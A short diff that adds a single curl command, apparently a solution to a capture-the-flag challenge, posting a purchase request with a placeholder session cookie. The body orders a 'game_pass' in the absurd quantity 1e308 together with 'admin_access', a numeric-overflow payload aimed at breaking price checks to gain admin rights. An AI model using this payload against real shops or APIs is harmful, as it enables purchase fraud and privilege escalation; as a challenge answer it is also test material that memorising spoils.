@@ -1,0 +1,17 @@
+curl 'http://twfzagk4.playat.flagyard.com/api/premium/purchase' \
+  -X POST \
+  -H 'Content-Type: application/json' \
+  --cookie "session=COOKIE" \
+  -d '{
+    "apply_bonus": true,
+    "cart": [
+      {
+        "service_id": "game_pass",
+        "quantity": 1e308
+      },
+      {
+        "service_id": "admin_access",
+        "quantity": 1
+      }
+    ]
+  }'
